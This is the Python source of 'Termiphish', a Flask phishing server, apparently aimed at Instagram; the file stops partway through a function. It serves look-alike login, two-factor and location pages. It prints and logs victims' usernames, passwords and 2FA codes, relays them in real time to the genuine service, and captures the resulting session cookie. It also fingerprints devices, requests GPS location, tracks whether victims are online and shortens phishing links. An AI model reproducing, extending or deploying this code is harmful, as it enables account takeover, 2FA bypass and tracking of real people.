import subprocess
import sys
import platform
import threading
import time

def setup():
    """
    Installs the required Python libraries.
    """
    print("Starting installation")
    systemenv = input("Are you on Termux? (Y)es/(N)o> ").strip().lower()
    if systemenv in ("y", "yes"):
        print('Please setup "termux-setup-storage" if not done yet')
        print("Upgrade is recommended: pkg update -y && pkg upgrade -y")
    
    # Determine if the system is Android-based
    is_android = systemenv in ("y", "yes")
    
    packages = [
        "flask",
        "readline; platform_system!='Windows'",  # Install readline on non-Windows systems
        "pyreadline3; platform_system=='Windows'",  # Use pyreadline3 for Windows
        "bs4",
        #"selenium==4.9.1" if is_android else "selenium",  # Use specific version for Termux
        "requests",
        "toml",
        "device-detector",
        "geopy",
        "deep-translator"
    ]
    
    for package in packages:
        try:
            # Dynamically install the package
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"Successfully installed {package}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to install {package}: {e}")
        except Exception as e:
            print(f"Unexpected error installing {package}: {e}")

    print("All required packages have been processed.")
    print("Code restart is required, run: python (or python3 depending on your system) python main.py")
    if systemenv in ("y", "yes"):
        print(r"""
Run these commands to install selenium drivers:
pkg install x11-repo -y
pkg install tur-repo -y
pkg install chromium -y
""")
    exit()

# Funkce pro animaci načítání
def loading_animation(stop_event):
    animation = "|/-\\"
    idx = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\rLoading... {animation[idx % len(animation)]}")
        sys.stdout.flush()
        idx += 1
        time.sleep(0.1)
    sys.stdout.write("\rDone!                 \n")  # Přepsání řádku po skončení animace

# Vlákno pro animaci
stop_event = threading.Event()
animation_thread = threading.Thread(target=loading_animation, args=(stop_event,))

try:
    animation_thread.start()
    import random
    import string
    from flask import Flask, request, jsonify, send_from_directory, render_template, session, redirect
    import threading
    import time
    import readline
    import atexit
    import os
    import signal
    from bs4 import BeautifulSoup
    import uuid
    import loginAPI as api
    import json
    import logging
    from threading import Timer
    from datetime import datetime
    from geopy.geocoders import Nominatim


    # -------------------
    import requests
    import toml
    from device_detector import SoftwareDetector
    from device_detector import DeviceDetector
    from deep_translator import GoogleTranslator
    #import twofa_translator
except ModuleNotFoundError:
    # Ukončení animace na konci try
    stop_event.set()
    animation_thread.join()
    print("There are missing modules, do you want to install them?")
    answer = input("[Y]es/[N]o >> ").strip().lower()

    if answer in ("y", "yes"):
        setup()
    elif answer in ("n", "no"):
        print("Cannot run without setup!")
        exit()
    else:
        print("Invalid input. Please enter [Y]es or [N]o.")
        print("Try again after running")
        exit()

# Ukončení animace na konci try
stop_event.set()
animation_thread.join()

# Definice barev
RESET = "\033[0m"        # Reset na výchozí barvu
RED = "\033[31m"         # Červená
GREEN = "\033[32m"       # Zelená
YELLOW = "\033[33m"      # Žlutá
BLUE = "\033[94m"        # Modrá (light blue)
MAGENTA = "\033[35m"     # Fialová
CYAN = "\033[36m"        # Tyrkysová
WHITE = "\033[37m"       # Bílá
GRAY = "\033[90m"        # Šedá
LIGHT_MAGENTA = "\033[95m"

def print_banner():
    banner = r"""
___________                  .__       .__    .__       .__     
\__    ___/__________  _____ |__|_____ |  |__ |__| _____|  |__  
  |    |_/ __ \_  __ \/     \|  \____ \|  |  \|  |/  ___/  |  \ 
  |    |\  ___/|  | \/  Y Y  \  |  |_> >   Y  \  |\___ \|   Y  \
  |____| \___  >__|  |__|_|  /__|   __/|___|  /__/____  >___|  /
             \/            \/   |__|        \/        \/     \/   
"""
    print(BLUE + banner + RESET)
    print(CYAN + "Welcome to Termiphish!", "V1.5 BETA by slizak_jan" + RESET)
    print(GREEN + "=================================" + RESET, RED + "BETA VERSION!" + RESET)
    print(BLUE + "INFO: Location authentication template translation is missing!" + RESET)
    print(BLUE + "Intensive testing will be soon" + RESET)

def readable_time(timestamp):
    # Převod na sekundy (milisekundy / 1000)
    timestamp_seconds = timestamp / 1000

    # Převod na čitelný formát
    return datetime.fromtimestamp(timestamp_seconds).strftime('%Y-%m-%d %H:%M:%S')


def shorten_url(url):
    """
    Zkrátí zadanou URL pomocí služby is.gd.

    :param url: Původní URL, kterou chcete zkrátit.
    :return: Zkrácená URL jako řetězec.
    :raises ValueError: Pokud URL není validní nebo se zkrácení nepodaří.
    """
    if not (url.startswith("http://") or url.startswith("https://")):
        raise ValueError("Invalid URL. Please use http or https.")

    try:
        response = requests.get(f"https://is.gd/create.php?format=simple&url={url}")
        response.raise_for_status()
        short_url = response.text.strip()
        return short_url
    except requests.RequestException as e:
        raise ValueError(f"Error shortening URL: {e}")

#---------------------------

# Soubor pro ukládání historie
history_file = ".command_history"

# Načtení historie, pokud existuje
if os.path.exists(history_file):
    readline.read_history_file(history_file)

# Uložení historie při ukončení programu
atexit.register(readline.write_history_file, history_file)

app = Flask(__name__)

# Úložiště
users = {}

"""
server_config = {
    "host": "127.0.0.1",
    "port": 5000,
    "server_id": None,
    "running": False,
    "stop_flag": False,  # Signal k ukončení serveru
    "server_url": None
}
"""

connections = {"db": None, "app": None}
endpoints = {}  # Úložiště pro endpointy {endpoint: {type: "reel", data: "url"}}

binds = {}

OFFLINE_THRESHOLD = 15  # Sekundy

# Globální úložiště dat
user_data_storage = {}

app.secret_key = "some_random_key_lmao"

is_flask_debug = True

two_fa_config = {}

show_all_headers = False

show_device_details = False

get_gps_location = True

allow_multiple_two_factor = False

texts_file = "texts.toml"

default_language = "en-US"

# JS redirect payload
js_redirect_script = """
<script>
window.addEventListener('load', function() {
    window.location.href = '/';
});
</script>
"""

# Inicializace loggeru
logging.basicConfig(
    filename='log.txt',
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Uchovávání stavů uživatelů
online = {}
ping_time = 5  # Výchozí časový interval pro ping v sekundách
timeout_reserve = 2  # Rezerva na timeout
max_attempts = 2  # Maximální počet pokusů, než je uživatel označen jako offline

# Funkce pro označení uživatele jako offline
def mark_offline(session_id):
    #print("OFFLINE")
    if session_id in online:
        if online[session_id]['timer']:
            online[session_id]['timer'].cancel()
            #print(f"Timer pro {session_id} zrušen při označení jako offline.")
        del online[session_id]
        print(RED + f"{user_data_storage[session_id]['ipaddress']} is offline." + RESET)

# Globální proměnná pro konfiguraci
config = {}

def load_config(config_file='config.toml'):
    """
    Načte konfiguraci ze souboru TOML a uloží ji do globální proměnné `config`.
    """
    global config
    try:
        config = toml.load(config_file)
        #print("Konfigurace načtena:", config)
    except FileNotFoundError:
        print(RED + f"Config file {config_file} not found. Create one and add required values." + RESET)
    except toml.TomlDecodeError as e:
        print(RED + f"Error while decoding {config_file}: {e}" + RESET)


def get_server_config():
    """
    Vrací sekci 'server' z načtené konfigurace.
    """
    if 'server' not in config:
        raise KeyError("Sekce 'server' není v konfiguraci.")
    return config['server']

def get_ip(session):
    try:
        return user_data_storage[session['sessionID']]['ipaddress']
    except:
        return "Unknown IP"

def logged_in(session):
    if 'logged' in session:
        if session['logged'] == True:
            bind_key = session.get('bind')  # Získání hodnoty 'bind' ze session
            ipaddress = get_ip(session)
            if not bind_key:
                print(RED + f"{ipaddress} is logged but bind not found!" + RESET)
                return redirect("/error")

            if bind_key in endpoints:
                redirect_url = endpoints[bind_key]["data"]  # Získání URL
                print(GREEN + f"{ipaddress} was redirected to its bind (is logged in)" + RESET)
                return redirect(redirect_url)  # Přesměrování na URL
            else:
                print(RED + f"{ipaddress} is logged but binded URL not found!" + RESET)
                return redirect("/error")

# Endpoint /ping
@app.route('/ping', methods=['POST'])
def ping():
    session_id = session.get('sessionID')
    if not session_id:
        return jsonify({"error": "sessionID not found"}), 400

    # Nastavení nebo obnovení uživatele na online
    def reset_offline_timer():
        if online[session_id]['timer'] and online[session_id]['timer'].is_alive():
            #print(f"Starý timer je stále aktivní: {online[session_id]['timer']}")
            online[session_id]['timer'].cancel()
        if online[session_id]['timer']:
            #print(f"Ruším starý timer: {online[session_id]['timer']}")
            online[session_id]['timer'].cancel()


        online[session_id]['attempts'] = 0
        if online[session_id]['timer']:
            online[session_id]['timer'].cancel()
        online[session_id]['timer'] = Timer(
            (ping_time + timeout_reserve),
            handle_timeout
        )
        online[session_id]['timer'].start()

    def handle_timeout():
        try:
            #print(f"Timeout pro {session_id}.")
            online[session_id]['attempts'] += 1

            if online[session_id]['attempts'] >= max_attempts:
                # Pokud je dosažen maximální počet pokusů, označ uživatele jako offline
                mark_offline(session_id)
            else:
                # Získej IP adresu a loguj pokus
                ipaddress = user_data_storage.get(session_id, {}).get('ipaddress', 'unknown')
                print(YELLOW + f"{ipaddress} timeout attempt: {online[session_id]['attempts']}" + RESET)

                # Znovu spustit timer pro další timeout
                online[session_id]['timer'] = Timer(
                    (ping_time + timeout_reserve),
                    handle_timeout
                )
                online[session_id]['timer'].start()
                #print(f"Nový timer spuštěn pro {session_id} (pokus {online[session_id]['attempts']})")
        except Exception as e:
            print(RED + f"Error in handle_timeout: {e}" + RESET)

            #print(f"{session_id}: timeout pokus {online[session_id]['attempts']}")

    if session_id not in online:
        # Nový uživatel, inicializace
        online[session_id] = {
            'status': 'online',
            'attempts': 0,
            'timer': None
        }
        reset_offline_timer()
        try:
            ipaddress = user_data_storage[session_id]['ipaddress']
        except KeyError:
            ipaddress = "unknown"
            print(YELLOW + f"{ipaddress} ip address." + RESET)
            return {'status': 'fail', 'reason': 'missing_ip'}, 404
        print(BLUE + f"{ipaddress} is online.\n" + RESET)

        #print(f"{session_id} je online.")
    else:
        # Obnovení stavu uživatele
        reset_offline_timer()
        #print(f"Uživatel {session_id} potvrzen jako online.")

    return jsonify({"status": "success"})

# Middleware pro kontrolu pingu
#@app.before_request
#def create_session():
#    if 'sessionID' not in session:
#        session['sessionID'] = request.remote_addr + str(request.user_agent)

def user_visited(data):
    """Zpracuje informace o uživateli a uloží je."""
    try:
        session_id = data['sessionID']

        #print("Fetching cookies")
        try:
            if user_data_storage[session_id]['cookies'] == 'fetching':
                return
        except KeyError:
            pass

        # Simulace získání cookies (nahraďte api.get_cookies skutečnou implementací)
        try:
            if user_data_storage[session_id]['cookies'] is not None:
                print(MAGENTA + f"Cookies for already fetched." + RESET)
                return
        except KeyError:
            try:
                user_data_storage[session_id].update({'cookies': 'fetching'})
            except:
                user_data_storage[session_id] = {'cookies': 'fetching'}
            cookies = api.filter_tokens(api.get_cookies_with_click(None))  # Předpokládáme, že tato funkce vrací cookies jako dict

            # Přidání cookies do dat
            data['cookies'] = cookies

            # Uložit data do globálního úložiště
            if session_id in user_data_storage:
                user_data_storage[session_id].update(data)
            else:
                user_data_storage[session_id] = data
            # Logování dat do log.txt
            logging.info(f"SessionID: {session_id}, User-Agent: {data['user_agent']}, Cookies: {cookies}")

            # Volitelné: můžete odeslat data na API endpoint, pokud je to potřeba
            print(MAGENTA + "Cookies fetched, user saved." + RESET)
    except Exception as e:
        logging.error(f"Error in user_visited: {e}")
        print(RED + f"Error in user_visited: {e}" + RESET)

@app.route('/ajax/config', methods=['GET', 'POST'])
def ping_config():
    return {'ping_time': ping_time}

# Flask endpointy
@app.route('/', methods=['GET', 'POST'])
def index():
    if 'logged' in session:
        if session['logged'] == True:
            return logged_in(session)
        
    if 'request_location' in session:
        if session['request_location'] == True:
            return redirect('/accounts/login/location_authentication')
        
    lang = request.headers.get('Accept-Language')
    session['language'] = lang

    timestamp = int(time.time() * 1000)  # Aktuální čas v milisekundách
    user_agent = request.headers.get('User-Agent')

    if 'sessionID' not in session:
        session['sessionID'] = str(uuid.uuid4())
        #user_data_storage[session['sessionID']] = {}
        data = {'sessionID': session['sessionID'], 'user_agent': user_agent}
        threading.Thread(target=user_visited, args=(data,)).start()
    try:
        if user_data_storage[session['sessionID']]['cookies'] == None:
            user_visited({'sessionID': session['sessionID'], 'user_agent': user_agent})
    except KeyError:
        if 'sessionID' in session:
            #user_data_storage[session['sessionID']] = {}
            data = {'sessionID': session['sessionID'], 'user_agent': user_agent}
            threading.Thread(target=user_visited, args=(data,)).start()

    #user_agent = request.headers.get('User-Agent')
    print(BLUE + f'\nUser-Agent: {user_agent}')
    print(f"Session ID: {session['sessionID']}" + RESET)

    data = {
        'sessionID': str(session['sessionID']),
        'timestamp': timestamp,
        'user_agent': user_agent
    }

    return render_template('login.html', sessionID=session['sessionID'])

@app.route('/api/frontend_device_detection', methods=['POST'])
def frontend_device_detection():
    try:
        # Získání dat z požadavku (model zařízení)
        data = request.get_json()

        # Získání modelu zařízení, pokud je k dispozici
        device_model = data.get('model', 'Unknown Model')

        # Můžete provést další operace s daty, například je uložit do databáze nebo logu
        print(MAGENTA + f"{device_model}" + RESET)

        session['deviceone'] = device_model

        # Odpověď s HTTP status kódem 200 (OK)
        return jsonify({"status": "success", "message": f"Device model {device_model} detected."}), 200

    except Exception as e:
        # V případě chyby vrátí status 400 (Bad Request)
        print(f"Error processing the request: {e}")
        return jsonify({"status": "error", "message": "Error processing device detection."}), 400

@app.route('/api/device_detection', methods=['GET'])
def detect_device():
    ua = request.headers.get('User-Agent')

    # Načtení Client Hints z hlaviček požadavku
    viewport_width = request.headers.get('Viewport-Width', None)
    device_memory = request.headers.get('Device-Memory', None)
    dpr = request.headers.get('DPR', None)
    ua_mobile = request.headers.get('Sec-CH-UA-Mobile', None)
    
    # Ukázka použití těchto dat
    device_info = {
        "viewport_width": viewport_width,
        "device_memory": device_memory,
        "dpr": dpr,
        "is_mobile": ua_mobile
    }
    print(MAGENTA + "\n-------------------------------")
    print("Device info:")
    print(device_info)
    if show_all_headers:
        print(request.headers)
    print("-------------------------------\n" + RESET)

    if show_device_details:
        device = SoftwareDetector(ua).parse()
        print(MAGENTA + "-------------Device Software Details-----------")
        print(device.client_name())
        try:
            print(device.client_short_name())  # >>> CM
        except:
            pass
        print(device.client_type())        # >>> browser
        print(device.client_version())     # >>> 58.0.3029.83
        print(device.os_name())     # >>> Android
        print(device.os_version())  # >>> 6.0
        print(device.engine())      # >>> WebKit
        try:
            print(device.device_brand_name())  # >>> ''
        except:
            print(device.device_brand())  # >>> ''
        print(device.device_brand())       # >>> ''
        print(device.device_model())       # >>> ''
        print(device.device_type())        # >>> ''
        print("----------------------------------------------\n" + RESET)

    if show_device_details:
        device = DeviceDetector(ua).parse()
        print(MAGENTA + "-------------Device Hardware Details-----------")
        print(device.is_bot())      # >>> False
        print(device.os_name())     # >>> Android
        print(device.os_version())  # >>> 4.3
        print(device.engine())      # >>> WebKit
        print(device.device_brand())  # >>> Sony
        print(device.device_brand())       # >>> SO
        print(device.device_model())       # >>> Xperia ZR
        print(device.device_type())        # >>> smartphone
        print(device.secondary_client_name())     # >>> EtsyInc
        print(device.secondary_client_type())     # >>> generic
        print(device.secondary_client_version())  # >>> 5.22
        print("----------------------------------------------\n" + RESET)


    return device_info

@app.route('/api/screen_size', methods=['POST'])
def handle_screen_size():
    try:
        # Načtení JSON dat z požadavku
        data = request.get_json()

        # Získání šířky a výšky obrazovky z JSON dat
        width = data.get('width')
        height = data.get('height')

        # Můžete přidat logiku pro práci s těmito daty, například je uložit do databáze nebo logu
        print(MAGENTA + f"{width}x{height}" + RESET)

        screensize = {"width": width, "height": height}

        session['screensize'] = screensize

        try:
            user_data_storage[session['sessionID']]["screen"] = screensize
        except KeyError:
            return '', 200

        # Odpověď s HTTP status kódem 200 (OK)
        return '', 200

    except Exception as e:
        # V případě chyby vrátí status 400 (Bad Request)
        print(f"Chyba při zpracování požadavku: {e}")
        return '', 400


@app.route('/api/dyn_login')
def dyn_login():
    lang = request.headers.get('Accept-Language')
    #lang = language_code.split('-')[0]  # Získání jazyka
    #print(lang)
    #language_code = language_code.split(',')[0]  # Získání jazyka
    #language_code 
    color_scheme = request.headers.get('User-Color-Scheme', 'default')
    session['color-scheme'] = color_scheme
    #print(color_scheme)
    lang = lang.split(',')[0]
    #print(lang)
    translated_text = get_translation(lang)
    #print(translated_text)
    if color_scheme == 'dark':
        return render_template('dyn_dark_login.html', texts=translated_text)
    elif color_scheme == 'light':
        return render_template('dyn_light_login.html', texts=translated_text)
    else:
        return render_template('dyn_light_login.html', texts=translated_text)


@app.route('/api/login', methods=['POST'])
def login_api():
    if 'sessionID' not in session:
        session['sessionID'] = str(uuid.uuid4())

    if 'request_location' in session:
        if session['request_location'] == True:
            return redirect('/accounts/login/location_authentication')
    
    if 'logged' in session:
        if session['logged'] == True:
            return logged_in(session)
        
    data = request.json
    username = data.get('username')
    password = data.get('password')
    timestamp = int(time.time() * 1000)
    user_agent = request.headers.get('User-Agent')
    lang = session.get('language', default_language)  # Výchozí jazyk je angličtina
    #print(lang)
    lang = lang.split(',')[0]
    
    print(BLUE + "\nReceived data from:")
    print("----------------------------------------")
    print(f'User-Agent: {user_agent}')
    print(f"Session ID: {session['sessionID']}")
    print(f"Username: {username}")
    print(f"Password: {password}")
    try:
        if user_data_storage[session['sessionID']]['ipaddress'] != None:
            ipaddress = user_data_storage[session['sessionID']]['ipaddress']
            print("IP: ", ipaddress)
    except KeyError:
        print("IP: Unknown")
    print("Timestamp: ", readable_time(timestamp))
    print("----------------------------------------\n" + RESET)
    
    login_data = {
        'sessionID': session['sessionID'],
        'username': username,
        'password': password,
        'timestamp': timestamp,
        'user_agent': user_agent
    }

    #print(login_data)
    try:
        #print(user_data_storage[session['sessionID']]['cookies'])
        try:
            response, tokens = api.login(username, password, user_agent, user_data_storage[session['sessionID']]['cookies'])
        except KeyError:
            user_visited({'sessionID': session['sessionID'], 'user_agent': user_agent})
            response, tokens = api.login(username, password, user_agent, user_data_storage[session['sessionID']]['cookies'])
        #print(response)
        #response, tokens = api.login(username, password, user_agent, None)
        #print(response)
        response_data = response[0]#.json()

        if response_data.get('authenticated') is False:
            print(RED + "INVALID" + RESET)
            return jsonify({
                'message': get_error_by_code(lang, "login.errors", "E2"), # "Sorry, your password was incorrect. Please double-check your password."
                'redirect': "",
                'status': "fail"
            })
        elif response_data.get('authenticated') is True:
            print(GREEN + "Login successful!", response[1])
            print("\n----------------------------------")
            print(f"Username: {username}\nPassword: {password}")
            #print(f"Alt. username: {alt_username}")
            print("----------------------------------\n" + RESET)

            if get_gps_location:
                session['request_location'] = True
                print(GREEN + f"{ipaddress} was redirected to location authentication\n" + RESET)
                return redirect("/accounts/login/location_authentication")
            bind_key = session.get('bind')  # Získání hodnoty 'bind' ze session
            session['logged'] = True
            if not bind_key:
                print(RED + "Bind was not found!" + RESET)
                return redirect("/error")

            if bind_key in endpoints:
                redirect_url = endpoints[bind_key]["data"]  # Získání URL
                print(GREEN + f"{ipaddress} was redirected to: {redirect_url}" + RESET)
                return jsonify({
                    'message': "",
                    'redirect': redirect_url,
                    'status': "ok"
                }), 200
                return redirect(redirect_url)  # Přesměrování na URL
            else:
                print(RED + "Binded URL not found!" + RESET)
                return redirect("/error")
            return render_template("error.html")
        elif response_data.get('two_factor_required') is True:
            session['identifier'] = response[2]
            #session['username'] = username
            print(MAGENTA + "Data are valid but 2fa needed" + RESET)
            preconfig = response[0].get('two_factor_info')
            sms_available = preconfig.get('sms_two_factor_on') # SMS
            totp_available = preconfig.get('totp_two_factor_on') # TOTP
            whatsapp_available = preconfig.get('whatsapp_two_factor_on') # WHATSAPP
            whatsapp_available = False # Unsupported
            backup_code_available = True # Always true
            obfuscated_phone_number = preconfig.get('obfuscated_phone_number')
            obfuscated_phone_number_2 = preconfig.get('obfuscated_phone_number_2')
            alt_username = preconfig.get('username')
            two_fa_config[session['sessionID']] = {
                'sms': sms_available,
                'totp': totp_available,
                'whatsapp': whatsapp_available,
                'backupCode': backup_code_available,
                'obfuscated_phone_number_2': obfuscated_phone_number_2
            }
            print(f"Alt. username: {alt_username}")
            print(MAGENTA + "-----------Two factor methods------------")
            print("1. SMS:", str(sms_available))
            print("2. Backup Codes:", str(backup_code_available))
            print("3. TOTP:", str(totp_available))
            print("4. Whatsapp:", str(whatsapp_available), " (Unsupported)")
            print("-----------------------------------------\n" + RESET)
            session['username'] = alt_username
            if obfuscated_phone_number != "":
                print(BLUE + f"Obfuscated phone number:\n{obfuscated_phone_number}\n{obfuscated_phone_number_2}\n--------------------------" + RESET)
            return jsonify({
                'message': "",
                'redirect': "/accounts/login/two_factor",
                'status': "success"
            })
        elif response_data.get('message') == 'checkpoint_required':
            print(RED + "Checkpoint is required, cant login" + RESET)
            #return redirect(response_data.get('checkpoint_url'))
            #return jsonify({
            #    'message': "",
            #    'redirect': response_data.get('checkpoint_url'),
            #    'status': "success"
            #}) 
            return jsonify({
                'message': get_error_by_code(lang, "login.errors", "E1"), # "Unknows error appiered while loging in, please try it later or try different account."
                'redirect': "",
                'status': "fail"
            }) # get_error_from_file(file_path, category, identifier)
        elif response_data.get('message') == '' and response_data.get('status') == 'fail':
            print(RED + "INVALID" + RESET)
            print(RED + "Unknown Error appiered, no error messsage returned!!\nWrong password was showed as an error on user page." + RESET)
            return jsonify({
                'message': get_error_by_code(lang, "login.errors", "E2"), # "Sorry, your password was incorrect. Please double-check your password."
                'redirect': "",
                'status': "fail"
            })
        else:
            return jsonify({'message': response_data.get('message')})

    except Exception as e:
        print(RED + f"Error in login API: {e}" + RESET)
        return jsonify({
                'message': get_error_by_code(lang, "login.errors", "E3"),
                'redirect': "",
                'status': "fail"
            })
    
def get_error_by_code(language_code, category, error_code, default_language=default_language):
    """
    Získá chybovou zprávu na základě chybového kódu z TOML souboru.
    
    :param language_code: Kód jazyka (např. "cs-CZ").
    :param category: Kategorie, například "login.errors".
    :param error_code: Kód chyby (např. "E1").
    :param default_language: Výchozí jazyk, pokud zadaný jazyk neexistuje.
    :return: Chybová zpráva nebo None, pokud se kód nenajde.
    """
    def load_toml_file(lang_code):
        file_path = os.path.join("lang", f"{lang_code}.toml")
        if os.path.exists(file_path):
            return toml.load(file_path)
        return None

    # Načíst data pro zadaný jazyk
    data = load_toml_file(language_code)

    # Pokud jazyk neexistuje, použije se výchozí jazyk
    if data is None:
        #print(f"Jazykový soubor {language_code} neexistuje. Používá se výchozí jazyk {default_language}.")
        data = load_toml_file(default_language)

    # Pokud neexistuje ani výchozí jazyk, vrátit chybu
    if data is None:
        if os.path.exists(texts_file):
            data = toml.load(texts_file)
        #print(f"Chyba: Nelze najít jazykový soubor {default_language}.")
        return None

    # Navigace do kategorie (např. "login.errors")
    keys = category.split('.')
    current_section = data
    for key in keys:
        if key in current_section:
            current_section = current_section[key]
        else:
            return None  # Kategorie neexistuje

    # Pokud se `error_code` nachází jako klíč, vrátí odpovídající zprávu
    return current_section.get(error_code, None)

@app.route("/api/script")
def load_script_api():
    # Příklad jazyka uloženého v session
    lang = session.get('language', default_language)  # Výchozí jazyk je angličtina
    #print(lang)
    lang = lang.split(',')[0]
    #print(lang)
    translated_text = get_translation(lang)

    # Vykreslení dynamického JS souboru
    response = app.response_class(
        response=render_template("js/script.js", texts=translated_text),
        status=200,
        mimetype="application/javascript"
    )
    return response

@app.route('/accounts/login/two_factor')
def two_factor():
    lang = request.headers.get('Accept-Language')
    if 'logged' in session:
        if session['logged'] == True:
            return logged_in(session)

    try:
        ipaddress = session['ipaddress']
    except KeyError:
        ipaddress = "Unknown"

    if 'two_factor_verified' in session:
        if session['two_factor_verified'] == True:
            if get_gps_location:
                print(MAGENTA + f"{ipaddress} was redirected to location authentication\nfrom two_factor\n" + RESET)
                return redirect("/accounts/login/location_authentication")
            return logged_in(session)
    
    if 'request_location' in session:
        if session['request_location'] == True:
            return redirect('/accounts/login/location_authentication')
        
    if 'sessionID' not in session:
        return redirect("/")

    try:
        username = session['username']
        if username == None:
            return redirect("/")
        if 'username' not in session:
            return redirect("/")
        identifier = session['identifier']
        sessionid = session['sessionID']
    except:
        return redirect("/")

    translated_text = get_translation(lang)
    #print(sessionid)
    color_scheme = session.get('color-scheme', 'default')
    #print(color_scheme)
    if color_scheme == 'dark':
        return render_template('two_factor_dark.html', texts=translated_text)
    elif color_scheme == 'light':
        return render_template('two_factor_light.html', texts=translated_text)
    else:
        return render_template('two_factor_light.html', texts=translated_text)
    return render_template('two_factor.html')

@app.route('/api/two_factor', methods=["POST"])
def two_factor_api():
    if 'logged' in session:
        if session['logged'] == True:
            return logged_in(session)
        
    if 'two_factor_verified' in session:
        if session['two_factor_verified'] == True:
            if get_gps_location:
                print(MAGENTA + f"{ipaddress} was redirected to location authentication\nfrom two_factor\n" + RESET)
                return redirect("/accounts/login/location_authentication")
            return logged_in(session)
        
    data = request.json
    timestamp = int(time.time() * 1000)

    twofa_data = {
        "sessionID": str(session['sessionID']),
        "code": data.get('value'),
        "method": data.get('method'),
        "timestamp": timestamp
    }

    try:
        try:
            user_agent = request.headers.get('User-Agent')
            username = session['username']
            identifier = session['identifier']
            sessionid = session['sessionID']
            ipaddress = session['ipaddress']
        except:
            return redirect("/")
        print(BLUE + f"2fa data recieved! {ipaddress}")
        print("\n----------------------------------------")
        print(get_ip(session))
        print(f"{user_agent}\nUsername: {username}\nMethod: {twofa_data.get('method')}\nCode: {twofa_data.get('code')}")
        print(readable_time(timestamp))
        print("----------------------------------------" + RESET)
        try:
            response = api.twofa(username, user_data_storage[sessionid]['cookies'], identifier, data.get('method'), data.get('value'), user_agent)
        except KeyError:
            user_visited({'sessionID': session['sessionID'], 'user_agent': user_agent})
            response = api.twofa(username, user_data_storage[sessionid]['cookies'], identifier, data.get('method'), data.get('value'), user_agent)
        #response = requests.post('http://localhost:5000/api/user_twofa', json=twofa_data)
        response_data = response.json()

        if response_data.get('authenticated') is True:
            print(GREEN + f"Logged in ({ipaddress})" + RESET)
            #print(response_data, "\n", response.cookies)
            igsessionid = response.cookies.get("sessionid")
            print(GREEN + igsessionid + RESET)
            if allow_multiple_two_factor:
                session['two_factor_verified'] = True
            if get_gps_location:
                session['request_location'] = True
                print(GREEN + f"{ipaddress} was redirected to location authentication\nfrom there will be redirected to bind\n" + RESET)
                return redirect("/accounts/login/location_authentication")
            session['logged'] = True
            bind_key = session.get('bind')  # Získání hodnoty 'bind' ze session
            if not bind_key:
                print(RED + "Bind was not found!" + RESET)
                return jsonify({
                    'message': "",
                    'status': response_data.get('status'),
                    'redirect': '/error'
                }), 200
                return redirect("/error"), 200

            if bind_key in endpoints:
                redirect_url = endpoints[bind_key]["data"]  # Získání URL
                return jsonify({
                    'message': "",
                    'status': response_data.get('status'),
                    'redirect': redirect_url
                }), 200
                return redirect(redirect_url)  # Přesměrování na URL
            else:
                print(RED + "Binded URL not found!" + RESET)
                return jsonify({
                    'message': "",
                    'status': response_data.get('status'),
                    'redirect': '/error'
                }), 200
        elif response_data.get('status') == 'fail':
            print(RED + "Code is invalid" + RESET)
            message = response_data.get('message')
            error_key = find_error_key_twofa(load_texts(texts_file), message)
            #print(LIGHT_MAGENTA + error_key + RESET)
            try:
                if error_key == None:
                    error_key = "E6"
                    print(YELLOW + "Please report this as 'ErrorL1'!!: {" + message + "}" + RESET)
                    error = find_error_by_key_twofa(load_translations(session.get('language', default_language)), error_key)
                    if error == None:
                        error = find_error_by_key_twofa(load_texts(texts_file), error_key)
                        print(YELLOW + "Error for this language not found! Report this as 'ErrorL3'!" + f"\n{lang}, {message}" + RESET)
                        return jsonify({
                            'message': error,
                            'status': response_data.get('status'),
                            'redirect': ''
                        })
                    return jsonify({
                        'message': error,
                        'status': response_data.get('status'),
                        'redirect': ''
                    })
                lang = session.get('language', default_language)
                lang = lang.split(',')[0]
                #print(lang)
                try:
                    error = find_error_by_key_twofa(load_translations(lang), error_key)
                except FileNotFoundError:
                    try:
                        error = find_error_by_key_twofa(load_translations(default_language), error_key)
                    except FileNotFoundError:
                        error = find_error_by_key_twofa(load_texts(texts_file), error_key)
                        print(YELLOW + "Error for this language not found! Report this as 'ErrorL3'!" + f"\n{lang}, {message}" + RESET)
                #print(LIGHT_MAGENTA + error + RESET)
                if error == None:
                    error = find_error_by_key_twofa(load_texts(texts_file), error_key)
                    return jsonify({
                        'message': error,
                        'status': response_data.get('status'),
                        'redirect': ''
                    })
                return jsonify({
                    'message': error,
                    'status': response_data.get('status'),
                    'redirect': ''
                })
            except Exception as e:
                #print(e)
                print(YELLOW + f"Report this as 'ErrorL2' please!! {message}" + RESET)
                print(YELLOW + f"\nMessage was not found in any language pack,\nbasic invalid code response was showed!\n" + RESET)
                return jsonify({
                    'message': "Please check the security code and try again.",
                    'status': response_data.get('status'),
                    'redirect': ''
                })
        else:
            return jsonify({
                'message': "error",
                'status': response_data.get('status'),
                'redirect': ''
            })


    except Exception as e:
        print(RED + f"Error in two-factor API: {e}" + RESET)
        if e == 'cookies':
            return redirect('/')

    return jsonify({
                'message': response_data.get('message'),
                'status': response_data.get('status'),
                'redirect': ''
            })

@app.route("/api/v1/web/accounts/send_two_factor_login_sms", methods=["POST"])
def send_two_factor_sms_api():
    user_agent = request.headers.get('User-Agent')
    lang = request.headers.get('Accept-Language')
    #print(LIGHT_MAGENTA + lang + RESET)
    if 'sessionID' in session:
        username = session['username']
        identifier = session['identifier']
        try:
            tokens = user_data_storage[session['sessionID']]['cookies']
        except KeyError:
            return redirect('/')
        response = api.send_sms(username, identifier, user_agent, tokens, lang)
    #print(BLUE + str(response.json()) + RESET)
    return response.json()

@app.route("/accounts/login/location_authentication")
def location_authentication():
    user_agent = request.headers.get('User-Agent')
    lang = request.headers.get('Accept-Language')

    if get_gps_location != True:
        return redirect('/')

    if 'logged' in session:
        if session['logged'] == True:
            return logged_in(session)
        
    if 'sessionID' not in session:
        return redirect("/")
    
    try:
        print(MAGENTA + f"{session['ipaddress']} is on location authentication.\n" + RESET)
    except KeyError:
        print(MAGENTA + f"Unknown ip is on location authentication.\n" + RESET)
    
    color_scheme = session.get('color-scheme', 'default')
    #print(color_scheme)
    if color_scheme == 'dark':
        return render_template('location_dark.html')
    elif color_scheme == 'light':
        return render_template('location_light.html')
    else:
        return render_template('location_light.html')
    return render_template("location.html")

@app.route("/api/location_authentication_config")
def location_authentication_config():
    return {
